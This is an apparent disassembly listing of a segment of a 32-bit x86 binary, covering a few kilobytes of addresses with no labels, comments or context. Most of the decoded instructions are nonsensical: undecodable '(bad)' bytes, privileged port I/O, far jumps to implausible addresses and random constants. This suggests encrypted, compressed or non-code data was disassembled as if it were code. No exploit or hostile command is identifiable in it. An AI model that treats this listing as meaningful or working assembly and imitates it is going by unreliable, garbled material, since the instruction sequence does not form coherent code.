  4225fb:	je     0x422658
  4225fd:	sti    
  4225fe:	inc    edx
  4225ff:	xchg   edi,eax
  422600:	scas   al,BYTE PTR es:[edi]
  422601:	add    BYTE PTR [ebx],al
  422603:	int3   
  422604:	iret   
  422605:	loope  0x4225f5
  422607:	stos   DWORD PTR es:[edi],eax
  422608:	sub    esi,DWORD PTR [edx+0x38a6ef8]
  42260e:	mov    edx,0x1d863fca
  422613:	add    edi,ecx
  422615:	add    ebx,DWORD PTR [edi]
  422617:	pop    ecx
  422618:	nop
  422619:	mov    ah,0xdc
  42261b:	jg     0x422629
  42261d:	push   ds
  42261e:	stos   DWORD PTR es:[edi],eax
  42261f:	xor    BYTE PTR [ebx+esi*2],0x68
  422623:	xor    ah,BYTE PTR [eax+0x3dc9a224]
  422629:	out    dx,al
  42262a:	loope  0x422611
  42262c:	pushf  
  42262d:	add    al,0xd6
  42262f:	mov    ecx,ebx
  422631:	xor    cl,BYTE PTR [eax]
  422633:	sub    ebx,DWORD PTR [edx-0x2a]
  422636:	adc    dh,BYTE PTR [eax+0x54e64949]
  42263c:	jnp    0x422624
  42263e:	pusha  
  42263f:	sti    
  422640:	fisub  WORD PTR [edx-0x6f30d035]
  422646:	das    
  422647:	mov    al,0x9f
  422649:	jae    0x4225e3
  42264b:	mov    dh,0xb4
  42264d:	rcr    esi,0x37
  422650:	mov    al,0xbc
  422652:	sub    eax,0xd8360e49
  422657:	push   ecx
  422658:	xchg   BYTE PTR es:[ebx+ecx*4],ah
  42265c:	adc    al,0x9a
  42265e:	push   es
  42265f:	mov    eax,0x75758e96
  422664:	jge    0x42261c
  422666:	mov    al,BYTE PTR [edi-0x5f]
  422669:	cmp    eax,0xf159fdf3
  42266e:	into   
  42266f:	setns  BYTE PTR [ecx-0x41]
  422673:	mov    ds:0x7b339796,al
  422678:	push   0x9
  42267a:	push   edx
  42267b:	retf   0xcc43
  42267e:	sub    BYTE PTR [edx*2-0x2fd2fe9],ah
  422685:	iret   
  422686:	adc    al,BYTE PTR [edx-0x318a50ea]
  42268c:	sub    eax,0x44e9c8f3
  422691:	pop    edx
  422692:	(bad)  
  422693:	and    eax,DWORD PTR ds:[edi+0x43b8a9a0]
  42269a:	lods   eax,DWORD PTR ds:[esi]
  42269b:	push   0x8d70e56d
  4226a0:	sub    eax,esi
  4226a2:	cmp    DWORD PTR [ebp+0x1a],edi
  4226a5:	add    BYTE PTR [esi-0xe3c1a24],0xf5
  4226ac:	pop    es
  4226ad:	popa   
  4226ae:	fsubr  QWORD PTR [eax+0xaa998d2]
  4226b4:	xchg   ebp,eax
  4226b5:	and    al,0x99
  4226b7:	bound  eax,QWORD PTR [eax]
  4226b9:	push   esi
  4226ba:	cmp    cl,BYTE PTR cs:[ecx-0x4bfea85e]
  4226c1:	add    eax,0x81c4dbed
  4226c6:	int3   
  4226c7:	(bad)  
  4226c8:	push   0x7fe33614
  4226cd:	in     al,dx
  4226ce:	mov    ?,WORD PTR [esi+0xe]
  4226d1:	sub    ah,BYTE PTR [ecx]
  4226d3:	out    dx,al
  4226d4:	fdiv   QWORD PTR [ebp+0x5d392fb0]
  4226da:	fisubr WORD PTR [edx-0x7dac0a0d]
  4226e0:	mov    esi,0x91a5a686
  4226e5:	push   edx
  4226e6:	push   cs
  4226e7:	cmp    eax,0x32ba0c6
  4226ec:	dec    edx
  4226ed:	in     eax,dx
  4226ee:	sbb    DWORD PTR [ebp+edx*1-0x47],ebp
  4226f2:	mov    ecx,0xc7e2ebb8
  4226f7:	cdq    
  4226f8:	adc    DWORD PTR [edi-0x3c137003],ebx
  4226fe:	ds pop ebp
  422700:	fcmove st,st(5)
  422702:	popa   
  422703:	sbb    eax,0x298c68cb
  422708:	inc    edi
  422709:	retf   0x48cb
  42270c:	pop    eax
  42270d:	mov    ds:0x8c529841,al
  422712:	fucomip st,st(1)
  422714:	inc    esi
  422715:	cli    
  422716:	pop    esi
  422717:	mov    ch,BYTE PTR [edi+0x7f249e94]
  42271d:	ins    BYTE PTR es:[edi],dx
  42271e:	sbb    DWORD PTR [ebx+0x51],edi
  422721:	and    eax,DWORD PTR [eax]
  422723:	sbb    eax,DWORD PTR [edx+0x39068e91]
  422729:	test   bh,bl
  42272b:	mov    ds:0x821bdc5c,eax
  422730:	retf   0x1af7
  422733:	push   ds
  422734:	mov    ds,WORD PTR ds:0x881de909
  42273a:	test   ch,dh
  42273c:	pop    ds
  42273d:	mov    bl,0xa5
  42273f:	clc    
  422740:	data16 mov ds:0xed5e55fa,al
  422746:	xor    eax,0x52f023d1
  42274b:	in     eax,0x34
  42274d:	ja     0x4226da
  42274f:	add    eax,0x2d78fbcb
  422754:	fdiv   QWORD PTR [esi-0x64]
  422757:	loopne 0x42272e
  422759:	push   es
  42275a:	fld    DWORD PTR [eax+0x151926c8]
  422760:	cmc    
  422761:	retf   0x18ae
  422764:	test   al,0x27
  422766:	push   esp
  422767:	xchg   ebp,eax
  422768:	test   ecx,edi
  42276a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42276b:	imul   eax,DWORD PTR [ebx+0x4de4b1cf],0x1e
  422772:	jne    0x4227e8
  422774:	(bad)  
  422775:	aad    0xd6
  422777:	mov    dh,0xd0
  422779:	pushf  
  42277a:	adc    al,0xc
  42277c:	inc    ebx
  42277d:	jnp    0x42272f
  42277f:	test   al,0x24
  422781:	lods   eax,DWORD PTR ds:[esi]
  422782:	xchg   ebx,eax
  422783:	(bad)  [ecx]
  422785:	(bad)  
  422786:	out    dx,eax
  422787:	gs jo  0x4227ed
  42278a:	in     al,0x15
  42278c:	mov    ds:0x29fa9bf6,al
  422791:	xchg   ecx,eax
  422792:	leave  
  422793:	mov    fs,esi
  422795:	jnp    0x422805
  422797:	xchg   ecx,eax
  422798:	push   ss
  422799:	aas    
  42279a:	loop   0x422755
  42279c:	enter  0x216e,0xa2
  4227a0:	or     eax,0x1cb21a20
  4227a5:	and    al,0xfe
  4227a7:	inc    edi
  4227a8:	(bad)  
  4227a9:	cli    
  4227aa:	mov    dh,0x18
  4227ac:	jno    0x422811
  4227ae:	mov    cl,0x68
  4227b0:	ja     0x422739
  4227b2:	mov    edi,0xd15a590b
  4227b7:	int    0x3b
  4227b9:	fcom   QWORD PTR [edi-0x43c88fa7]
  4227bf:	popf   
  4227c0:	cmp    al,0xa0
  4227c2:	mov    dh,0xfe
  4227c4:	jne    0x42274f
  4227c6:	mov    WORD PTR ds:0x1af35cbc,?
  4227cc:	imul   ecx,DWORD PTR [ebp-0x485d6600],0x43
  4227d3:	sbb    edx,esp
  4227d5:	push   ss
  4227d6:	(bad)  
  4227d7:	lods   eax,DWORD PTR ds:[esi]
  4227d8:	out    dx,eax
  4227d9:	dec    edi
  4227da:	cmp    eax,0x12184766
  4227df:	and    DWORD PTR [ebp+0x52914c49],ecx
  4227e5:	push   eax
  4227e6:	add    al,0xe2
  4227e8:	sbb    al,0xd1
  4227ea:	into   
  4227eb:	cmp    DWORD PTR [edi],edi
  4227ed:	es xchg edi,eax
  4227ef:	mov    ch,0x27
  4227f1:	xchg   ebx,eax
  4227f2:	cmp    al,0x45
  4227f4:	add    BYTE PTR [eax+0x7a],0x79
  4227f8:	pop    edx
  4227f9:	jle    0x422808
  4227fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227fc:	lock nop
  4227fe:	dec    ebx
  4227ff:	pop    ss
  422800:	repnz pusha 
  422802:	shl    esp,cl
  422804:	sub    BYTE PTR [edi-0x79],cl
  422807:	add    bl,bh
  422809:	call   0x3f55d00e
  42280e:	mov    ds:0x4e84b680,eax
  422813:	sub    eax,0x455ed40a
  422818:	mov    ah,0x79
  42281a:	or     esi,eax
  42281c:	clc    
  42281d:	pop    ss
  42281e:	call   0xe9c80c24
  422823:	jnp    0x422865
  422825:	outs   dx,BYTE PTR ds:[esi]
  422826:	test   eax,0x72d01820
  42282b:	cmp    ebp,0x55
  42282e:	pop    ecx
  42282f:	cmp    dh,bh
  422831:	out    0xd4,eax
  422833:	and    eax,0x7cf86a7d
  422838:	loope  0x4227da
  42283a:	in     eax,dx
  42283b:	enter  0xca2c,0xb9
  42283f:	or     DWORD PTR [esp+ecx*1-0x76],0xfffffff9
  422844:	mov    eax,ds:0x535a4a5a
  422849:	pop    esp
  42284a:	pop    eax
  42284b:	mov    ebx,ebx
  42284d:	sbb    eax,0xf408d14a
  422852:	call   0xc315e892
  422857:	jno    0x4227ee
  422859:	aam    0x1b
  42285b:	jecxz  0x422805
  42285d:	retf   
  42285e:	sti    
  42285f:	mov    bh,0xa8
  422861:	mov    esp,DWORD PTR [ebx+0x315ddb23]
  422867:	repz and BYTE PTR cs:[ebx],bh
  42286b:	jecxz  0x4228e0
  42286d:	inc    esp
  42286e:	(bad)  
  42286f:	pop    edx
  422870:	(bad)  [eax+0x54]
  422873:	cwde   
  422874:	loope  0x42280a
  422876:	in     eax,dx
  422877:	jb     0x422802
  422879:	mov    al,ds:0x976cc8c0
  42287e:	ins    DWORD PTR es:[edi],dx
  42287f:	std    
  422880:	sub    al,0x19
  422882:	arpl   WORD PTR [ecx],sp
  422884:	fs cli 
  422886:	pop    ebp
  422887:	test   DWORD PTR [esi-0x12],ecx
  42288a:	and    BYTE PTR [eax+ecx*2],dl
  42288d:	and    BYTE PTR [edi],ch
  42288f:	jle    0x4228a0
  422891:	push   esi
  422892:	sbb    al,0xfa
  422894:	iret   
  422895:	pushf  
  422896:	adc    dl,dl
  422898:	jns    0x422848
  42289a:	mov    dl,0x13
  42289c:	ror    BYTE PTR [esi],0x5f
  42289f:	enter  0x6644,0xb2
  4228a3:	sbb    BYTE PTR [eax+0x229d4392],bh
  4228a9:	mov    esp,0x74abaed3
  4228ae:	pop    ebx
  4228af:	fisubr WORD PTR [eax-0x7e3336c9]
  4228b5:	and    dl,0x6d
  4228b8:	add    eax,0xdea77d1d
  4228bd:	or     eax,0xd40a3ef7
  4228c2:	mov    ah,0x3e
  4228c4:	mov    bl,0x52
  4228c6:	mov    ds:0xfc56eef3,eax
  4228cb:	push   ebp
  4228cc:	add    edi,esp
  4228ce:	adc    BYTE PTR [eax+eax*4],dh
  4228d1:	xor    BYTE PTR [edx-0x7b],ch
  4228d4:	pop    ebx
  4228d5:	stc    
  4228d6:	icebp  
  4228d7:	dec    ecx
  4228d8:	jbe    0x422866
  4228da:	sub    eax,0x99cf6289
  4228df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228e0:	jns    0x42294b
  4228e2:	jae    0x4228c5
  4228e4:	dec    esi
  4228e5:	cwde   
  4228e6:	std    
  4228e7:	jbe    0x42288e
  4228e9:	retf   
  4228ea:	add    eax,edx
  4228ec:	or     al,0xac
  4228ee:	sbb    BYTE PTR [eax+edi*8+0x70d1bd4c],al
  4228f5:	sti    
  4228f6:	mov    fs,ebp
  4228f8:	(bad)  
  4228fa:	popa   
  4228fb:	test   al,0xbe
  4228fd:	imul   esi,DWORD PTR [ebx],0x5cc13b32
  422903:	jge    0x422963
  422905:	cli    
  422906:	inc    esp
  422907:	xor    DWORD PTR [edx-0x76bcb640],esi
  42290d:	ret    0x3eb8
  422910:	lock mov al,0x4a
  422913:	popa   
  422914:	cwde   
  422915:	fisub  DWORD PTR [edi]
  422917:	arpl   WORD PTR [ecx+0x6c],si
  42291a:	dec    ebx
  42291b:	inc    ecx
  42291c:	jle    0x422984
  42291e:	jl     0x42293d
  422920:	push   0xee416e1f
  422925:	sub    DWORD PTR [esi-0x380bcca7],edx
  42292b:	outs   dx,BYTE PTR ds:[esi]
  42292c:	jno    0x42295d
  42292e:	pop    esi
  42292f:	hlt    
  422930:	sbb    BYTE PTR [ecx],ch
  422932:	and    esi,ebx
  422934:	sbb    eax,0xdb81a6f0
  422939:	cs ret 0xf073
  42293d:	adc    ebx,0x2f3b51ee
  422943:	adc    al,0x14
  422945:	push   ebp
  422946:	fwait
  422947:	xor    DWORD PTR [ecx-0x64],0xfffffff9
  42294b:	dec    esp
  42294c:	mov    cl,0xcd
  42294e:	outs   dx,BYTE PTR ds:[esi]
  42294f:	not    BYTE PTR [esi-0x149e8134]
  422955:	imul   ebp,ecx,0x60e8b328
  42295b:	add    eax,0xcf6a257c
  422960:	int3   
  422961:	sub    eax,0x28a677dd
  422966:	sub    al,0xc0
  422968:	and    BYTE PTR [edx-0x78e04ee2],0x93
  42296f:	mov    esi,0x19b6dbe8
  422974:	and    dl,BYTE PTR [eax-0x6c77d0d4]
  42297a:	jg     0x4229f6
  42297c:	aam    0x51
  42297e:	mov    bh,0xf5
  422980:	jp     0x4229f5
  422982:	inc    edx
  422983:	out    0x1d,al
  422985:	xchg   ebx,eax
  422986:	pop    ss
  422987:	jmp    0x295888d7
  42298c:	fs sbb al,0xba
  42298f:	or     dl,BYTE PTR [edi+0x1d2c41ef]
  422995:	inc    edi
  422996:	js     0x422943
  422998:	cld    
  422999:	sub    eax,0x352be5be
  42299e:	xchg   ebx,eax
  42299f:	push   esi
  4229a0:	cmc    
  4229a1:	push   0x39
  4229a3:	outs   dx,DWORD PTR ds:[esi]
  4229a4:	jp     0x422a0b
  4229a6:	adc    eax,DWORD PTR [ebx]
  4229a8:	jmp    0x6470:0x7dbbe5ec
  4229af:	aam    0x44
  4229b1:	out    dx,eax
  4229b2:	mov    dh,0x81
  4229b4:	pop    esp
  4229b5:	mov    ds:0x7916d458,eax
  4229ba:	mov    ebp,0xd398a8c5
  4229bf:	out    dx,al
  4229c0:	jo     0x4229a0
  4229c2:	inc    ecx
  4229c3:	std    
  4229c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229c5:	(bad)  
  4229c7:	clc    
  4229c8:	(bad)  
  4229c9:	cld    
  4229ca:	in     eax,0x41
  4229cc:	pop    eax
  4229cd:	popf   
  4229ce:	nop
  4229cf:	jl     0x422a25
  4229d1:	mov    bh,0x4c
  4229d3:	pop    esi
  4229d4:	repz fbld TBYTE PTR cs:[edi]
  4229d8:	dec    eax
  4229d9:	iret   
  4229da:	sub    bl,BYTE PTR [edx]
  4229dc:	and    bh,BYTE PTR [eax-0x33316319]
  4229e2:	(bad)  
  4229e3:	jae    0x4229d6
  4229e5:	cdq    
  4229e6:	add    al,0x6a
  4229e8:	inc    ebp
  4229e9:	aas    
  4229ea:	and    bl,BYTE PTR [ecx-0x3581d63a]
  4229f0:	pop    ss
  4229f1:	fidivr WORD PTR [eax+0x57]
  4229f4:	sub    dh,0xac
  4229f7:	xchg   ebp,eax
  4229f8:	jmp    0x42299e
  4229fa:	pusha  
  4229fb:	dec    esp
  4229fc:	inc    eax
  4229fd:	sbb    DWORD PTR [ebp+0x27712c6d],ebx
  422a03:	jge    0x422a41
  422a05:	mov    dl,0x5b
  422a07:	inc    esp
  422a08:	push   ecx
  422a09:	movaps xmm3,XMMWORD PTR [ebp-0x4f]
  422a0d:	mov    eax,ds:0xfddc9159
  422a12:	sbb    eax,0xe6b2efb5
  422a17:	mov    bh,0x86
  422a19:	pop    ds
  422a1a:	not    DWORD PTR [ecx]
  422a1c:	mov    edx,0xe08417d5
  422a21:	sti    
  422a22:	stc    
  422a23:	jbe    0x4229f0
  422a25:	dec    ebx
  422a26:	jns    0x4229b9
  422a28:	mov    ebx,0xbf83ea4d
  422a2d:	retf   
  422a2e:	fcmovnb st,st(5)
  422a30:	fisttp QWORD PTR [eax]
  422a32:	jno    0x4229eb
  422a34:	sti    
  422a35:	mov    ch,0x51
  422a37:	mov    esi,0x3983d0e7
  422a3c:	(bad)  
  422a3d:	out    0x10,eax
  422a3f:	sub    edi,DWORD PTR [eax]
  422a41:	xor    BYTE PTR [esi+0x2f2346ac],al
  422a47:	out    0xcc,al
  422a49:	repz jae 0x4229f4
  422a4c:	xchg   esi,eax
  422a4d:	outs   dx,BYTE PTR ds:[esi]
  422a4e:	test   eax,0xef285644
  422a53:	mov    ecx,0xc13ab68b
  422a58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a59:	cmp    BYTE PTR [esp+edx*8-0x3ed83bcf],0x22
  422a61:	lea    esi,[edi]
  422a63:	add    ebx,DWORD PTR [ebx-0x5667bc7b]
  422a69:	push   es
  422a6a:	enter  0xcb84,0xef
  422a6e:	or     DWORD PTR [esi],ebx
  422a70:	mov    ebp,0xb91891e4
  422a75:	lds    ecx,FWORD PTR [eax+0x43e8ab06]
  422a7b:	ror    BYTE PTR [ebx],cl
  422a7d:	sub    ebx,DWORD PTR [edi]
  422a7f:	or     DWORD PTR ds:[esi+edx*1-0x53436dc],eax
  422a87:	add    BYTE PTR [ebp+0x26810829],ch
  422a8d:	cmc    
  422a8e:	jl     0x422a4a
  422a90:	fcomp  DWORD PTR [edi-0x234ca2b1]
  422a96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a97:	cmp    DWORD PTR ds:[eax],eax
  422a9a:	stos   BYTE PTR es:[edi],al
  422a9b:	pushw  0xffdd
  422a9e:	enter  0x526a,0x64
  422aa2:	retf   
  422aa3:	jne    0x422ab6
  422aa5:	sbb    esi,DWORD PTR [ebp-0x72]
  422aa8:	mov    ds:0xa9927299,eax
  422aad:	(bad)
  422ab1:	xchg   ecx,eax
  422ab2:	mov    WORD PTR [ebp-0x20],ds
  422ab5:	call   0x301e76cd
  422aba:	or     bh,dh
  422abc:	imul   edi,DWORD PTR [edx+0x5d],0x6f82b21c
  422ac3:	call   0xaafb:0xe7d114bc
  422aca:	jg     0x422a7d
  422acc:	ret    
  422acd:	aad    0x15
  422acf:	mov    ds:0xf715827b,al
  422ad4:	fwait
  422ad5:	mov    bh,0x26
  422ad7:	sub    ecx,DWORD PTR [eax+ecx*2-0x55a35428]
  422ade:	ret    
  422adf:	cld    
  422ae0:	cmp    ah,BYTE PTR [edx-0x6ec720dc]
  422ae6:	retf   0x9497
  422ae9:	aas    
  422aea:	inc    ecx
  422aeb:	xor    edi,esi
  422aed:	mov    dh,0xb9
  422aef:	lods   eax,DWORD PTR ds:[esi]
  422af0:	xchg   edi,eax
  422af1:	inc    eax
  422af2:	pop    ds
  422af3:	rcl    edx,0x5f
  422af6:	or     DWORD PTR [ecx],edi
  422af8:	add    eax,0xea625eb0
  422afd:	mov    dh,cl
  422aff:	push   ebp
  422b00:	lds    eax,FWORD PTR [ecx-0x2a]
  422b03:	sti    
  422b04:	push   edi
  422b05:	jl     0x422b0a
  422b07:	adc    eax,0x893417f7
  422b0c:	mov    edi,0x902c95d0
  422b11:	dec    esi
  422b12:	and    eax,0xd9ff9386
  422b17:	into   
  422b18:	add    DWORD PTR [edx+0x5c52908f],esi
  422b1e:	ret    
  422b1f:	shr    DWORD PTR [ecx],cl
  422b21:	xchg   edx,eax
  422b22:	mov    BYTE PTR [ebx-0x7ed0c164],dl
  422b28:	xchg   esi,eax
  422b29:	ins    BYTE PTR es:[edi],dx
  422b2a:	sub    DWORD PTR [ebx],0xffffffa1
  422b2d:	and    esi,edx
  422b2f:	mov    ebp,gs
  422b31:	and    al,0x43
  422b33:	loope  0x422af6
  422b35:	sub    bl,BYTE PTR [ebx+0x46417cda]
  422b3b:	aad    0xb7
  422b3d:	jns    0x422ad4
  422b3f:	inc    eax
  422b40:	fdiv   QWORD PTR [ebx]
  422b42:	or     eax,0x8a05fd05
  422b47:	jmp    0x422b45
  422b49:	pop    ebx
  422b4a:	xor    al,0x2a
  422b4c:	je     0x422bc5
  422b4e:	pusha  
  422b4f:	add    al,0x1c
  422b51:	jmp    0x422b8b
  422b53:	mov    eax,0xd434df3d
  422b58:	mov    dl,0xe9
  422b5a:	dec    ebx
  422b5b:	xor    DWORD PTR [ebp-0x44],eax
  422b5e:	mov    WORD PTR [ebx+0x64b27ea3],gs
  422b64:	jle    0x422bdc
  422b66:	mov    ebp,0x8bdece92
  422b6b:	lds    ebx,FWORD PTR [esi-0xd]
  422b6e:	jp     0x422b66
  422b70:	jp     0x422bc4
  422b72:	sub    BYTE PTR [esi-0x2d522db9],ch
  422b78:	jle    0x422be5
  422b7a:	xchg   BYTE PTR ds:0x25f326b8,ah
  422b80:	and    esp,DWORD PTR [eax-0x21]
  422b83:	(bad)  
  422b84:	fmul   QWORD PTR [esi-0x4dbc6724]
  422b8a:	mov    ds:0xdedb5c5a,al
  422b8f:	sbb    eax,0x4ebe95c0
  422b94:	dec    ecx
  422b95:	or     BYTE PTR [edx-0x2f1f0449],bh
  422b9b:	cmp    esp,DWORD PTR [esi+0x7228146e]
  422ba1:	(bad)  
  422ba2:	jnp    0x422be0
  422ba4:	adc    edx,ecx
  422ba6:	out    dx,eax
  422ba7:	in     al,0x56
  422ba9:	mov    ebp,0x116e6669
  422bae:	bound  edi,QWORD PTR [ebp+0x54744abf]
  422bb4:	xor    dh,BYTE PTR [edx-0x5aac480b]
  422bba:	cld    
  422bbb:	bound  eax,QWORD PTR [ebx]
  422bbd:	das    
  422bbe:	imul   edx,esi,0xffffffba
  422bc1:	jae    0x422bdb
  422bc3:	pusha  
  422bc4:	mov    esp,0x7568b5b2
  422bc9:	outs   dx,BYTE PTR ds:[esi]
  422bca:	aam    0xdd
  422bcc:	call   0x9b669c7a
  422bd1:	das    
  422bd2:	clc    
  422bd3:	fld    TBYTE PTR [edi+eiz*2-0x33a13ca6]
  422bda:	test   BYTE PTR [eax-0x2c4c1c53],ah
  422be0:	int3   
  422be1:	retf   
  422be2:	xchg   BYTE PTR ds:0xcfec6c48,al
  422be8:	dec    ecx
  422be9:	mov    edi,0xb94c31f7
  422bee:	pop    es
  422bef:	inc    eax
  422bf0:	cld    
  422bf1:	xor    bh,BYTE PTR [edx+0x2b]
  422bf4:	gs or  eax,0xdcc2307
  422bfa:	(bad)  
  422bfb:	call   DWORD PTR [ecx]
  422bfd:	pop    ds
  422bfe:	add    dl,BYTE PTR [ebp-0x35]
  422c01:	and    BYTE PTR [edx],dh
  422c03:	and    ebp,DWORD PTR ds:[ebx+0x46]
  422c07:	mov    DWORD PTR [eax+0x13],ebx
  422c0a:	fwait
  422c0b:	or     BYTE PTR [ebp+0x5d],dl
  422c0e:	ins    BYTE PTR es:[edi],dx
  422c0f:	add    BYTE PTR [esi],cl
  422c11:	mov    ah,0x34
  422c13:	jno    0x422c5d
  422c15:	add    dh,BYTE PTR [ecx]
  422c17:	and    bl,BYTE PTR [eax]
  422c19:	sbb    eax,0xe740e94c
  422c1e:	jg     0x422c31
  422c20:	fimul  WORD PTR [ebx]
  422c22:	inc    ebx
  422c23:	repz retf 0x6e17
  422c27:	fist   DWORD PTR [edi-0x29]
  422c2a:	repnz in eax,0xc1
  422c2d:	pop    ecx
  422c2e:	push   ss
  422c2f:	lock jne 0x422c86
  422c32:	data16 sbb dl,BYTE PTR [ebx+0x6ea320de]
  422c39:	push   ds
  422c3a:	repnz loopne 0x422cbb
  422c3d:	jbe    0x422c79
  422c3f:	mov    WORD PTR [esi-0x40e48e88],ds
  422c45:	cmc    
  422c46:	and    eax,0x64b31b95
  422c4b:	cmp    BYTE PTR [esp+esi*2-0x21],cl
  422c4f:	push   ss
  422c50:	jl     0x422cd1
  422c52:	mov    BYTE PTR [ebx-0x38],bl
  422c55:	aam    0xbd
  422c57:	fimul  DWORD PTR [eax+0x42]
  422c5a:	out    0x72,al
  422c5c:	dec    eax
  422c5d:	repz int3 
  422c5f:	sbb    BYTE PTR [esi-0x2],0xc7
  422c63:	test   al,0x4b
  422c65:	fcom   QWORD PTR [ebx-0x6cd32b3d]
  422c6b:	pop    es
  422c6c:	int    0xdc
  422c6e:	hlt    
  422c6f:	mov    ebp,0xde622ad7
  422c74:	int    0x4d
  422c76:	cmp    DWORD PTR [edx+0x6c],esi
  422c79:	xor    bl,ah
  422c7b:	cmp    al,0x8a
  422c7d:	call   0xf7fca88c
  422c82:	in     al,dx
  422c83:	jge    0x422cc3
  422c85:	hlt    
  422c86:	jne    0x422c8f
  422c88:	and    eax,0x4cc8b9cd
  422c8d:	push   ecx
  422c8e:	pusha  
  422c8f:	ja     0x422cd9
  422c91:	push   es
  422c92:	(bad)
  422c96:	add    BYTE PTR [bx+si],al
	...
  422d11:	add    BYTE PTR [eax],al
  422d13:	add    BYTE PTR [esi-0x8131a83],cl
  422d19:	cld    
  422d1a:	(bad)  
  422d1b:	jg     0x422d8f
  422d1d:	and    eax,0xd64d1474
  422d22:	jl     0x422d93
  422d24:	into   
  422d25:	ret    0x1
  422d28:	imul   eax,DWORD PTR [edi],0x0
  422d2b:	add    bh,bh
  422d2d:	pop    ebp
  422d2e:	or     BYTE PTR [edx],0x3a
  422d31:	jmp    0x422d0a
  422d33:	pop    ebx
  422d34:	js     0x422d53
  422d36:	jo     0x422d59
  422d38:	jo     0x422db2
  422d3a:	rcr    BYTE PTR ds:0x69ef4385,cl
  422d40:	adc    ch,BYTE PTR [edi+0x3001b04b]
  422d46:	jl     0x422d68
  422d48:	sbb    al,BYTE PTR [edi+eax*2]
  422d4b:	or     al,0xe7
  422d4d:	lds    esi,FWORD PTR [edx-0x3ab776ee]
  422d53:	mov    dh,0xf4
  422d55:	icebp  
  422d56:	jb     0x422d94
  422d58:	fwait
  422d59:	popf   
  422d5a:	pop    es
  422d5b:	aad    0x64
  422d5d:	or     eax,0x206c017e
  422d62:	test   DWORD PTR [edx-0x2e1cadb8],0x6f49fa5a
  422d6c:	and    bh,BYTE PTR [esi+0x7acab442]
  422d72:	fucomip st,st(2)
  422d74:	paddsw mm7,QWORD PTR [edx+0x5750cc0c]
  422d7b:	or     al,0xee
  422d7d:	test   DWORD PTR ss:[ebx+0x3a714b82],edx
  422d84:	jbe    0x422d5a
  422d86:	scas   eax,DWORD PTR es:[edi]
  422d87:	push   es
  422d88:	or     eax,0xc2406391
  422d8d:	pop    ecx
  422d8e:	push   esi
  422d8f:	fisttp WORD PTR [esi+esi*8-0x6e]
  422d93:	mov    edi,0xd5308f19
  422d98:	jge    0x422d4a
  422d9a:	push   es
  422d9b:	mov    ecx,0x7b7210bb
  422da0:	cs push ebp
  422da2:	mov    ecx,0xaf71ea85
  422da7:	cwde   
  422da8:	and    bl,bh
  422daa:	push   esp
  422dab:	mov    esp,0xe5442f8e
  422db0:	(bad)  
  422db1:	jmp    0x2df:0x83ddb23e
  422db8:	cdq    
  422db9:	xor    BYTE PTR [esi-0x29],cl
  422dbc:	mov    ecx,0x830c1c1f
  422dc1:	and    eax,0xa92e0f28
  422dc6:	xchg   esp,eax
  422dc7:	(bad)  
  422dc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422dc9:	pop    edi
  422dca:	inc    esi
  422dcb:	push   ss
  422dcc:	xor    eax,0x4f01aa4c
  422dd1:	icebp  
  422dd2:	add    DWORD PTR [edi],eax
  422dd4:	les    ebx,FWORD PTR [esi-0x21931968]
  422dda:	mov    edx,DWORD PTR [edx-0x7d2495cb]
  422de0:	mov    ebp,0x45785d4c
  422de5:	in     eax,0x1
  422de7:	or     BYTE PTR [ebx],cl
  422de9:	push   0x391473cb
  422dee:	mov    dl,0x70
  422df0:	inc    ecx
  422df1:	mov    ch,0x9e
  422df3:	call   DWORD PTR [eax]
  422df5:	outs   dx,BYTE PTR ds:[esi]
  422df6:	and    al,0x48
  422df8:	jnp    0x422dbb
  422dfa:	scas   al,BYTE PTR es:[edi]
  422dfb:	ret    
  422dfc:	and    esp,DWORD PTR ds:0x4f0b58c8
  422e02:	in     eax,dx
  422e03:	adc    BYTE PTR [esi],bh
  422e05:	fsubrp st(2),st
  422e07:	imul   edx,edi,0x643eceef
  422e0d:	jbe    0x422e16
  422e0f:	pop    esp
  422e10:	pop    eax
  422e11:	aas    
  422e12:	push   edi
  422e13:	xor    DWORD PTR [eax+0x12200417],0xc497c1b
  422e1d:	out    dx,eax
  422e1e:	(bad)  
  422e1f:	mov    ax,ds:0xd947d943
  422e25:	dec    esi
  422e26:	push   esi
  422e27:	in     al,0xac
  422e29:	fldenv [esi-0x50]
  422e2c:	ins    BYTE PTR es:[edi],dx
  422e2d:	cmp    cl,BYTE PTR [esi]
  422e2f:	neg    BYTE PTR [esi+0x54598144]
  422e35:	push   edx
  422e36:	stos   DWORD PTR es:[edi],eax
  422e37:	std    
  422e38:	scas   al,BYTE PTR es:[edi]
  422e39:	lods   al,BYTE PTR ds:[esi]
  422e3a:	pop    esp
  422e3b:	jno    0x422dff
  422e3d:	in     al,dx
  422e3e:	aad    0xfe
  422e40:	inc    eax
  422e41:	and    BYTE PTR [eax+ebp*8],bl
  422e44:	mov    eax,ds:0x689335d9
  422e49:	xchg   ebx,eax
  422e4a:	mov    dh,0xd
  422e4c:	out    0x16,eax
  422e4e:	or     DWORD PTR [ecx-0x7a],0x1b201eb7
  422e55:	jp     0x422e85
  422e57:	xchg   edx,eax
  422e58:	sub    BYTE PTR [ecx-0x45],0xeb
  422e5c:	inc    eax
  422e5d:	cli    
  422e5e:	add    al,dh
  422e60:	in     eax,0x88
  422e62:	hlt    
  422e63:	adc    ch,0x4f
  422e66:	sub    cl,dh
  422e68:	cmp    al,BYTE PTR [ecx-0x38368aba]
  422e6e:	mov    eax,0x3c45bcc0
  422e73:	shr    bh,0x60
  422e76:	jmp    0x422e6f
  422e78:	popa   
  422e79:	clc    
  422e7a:	xor    al,0xf1
  422e7c:	shl    edx,1
  422e7e:	add    ebp,edi
  422e80:	mov    ah,0xa3
  422e82:	cdq    
  422e83:	cmp    esi,DWORD PTR [edx+0x76]
  422e86:	jmp    0x422e8e
  422e88:	jecxz  0x422ee8
  422e8a:	push   ebp
  422e8b:	push   eax
  422e8c:	aaa    
  422e8d:	ds jl  0x422ef9
  422e90:	pop    es
  422e91:	xchg   BYTE PTR [ecx],al
  422e93:	cmp    bh,BYTE PTR [edx]
  422e95:	adc    al,0xe1
  422e97:	inc    esp
  422e98:	mov    al,0xbf
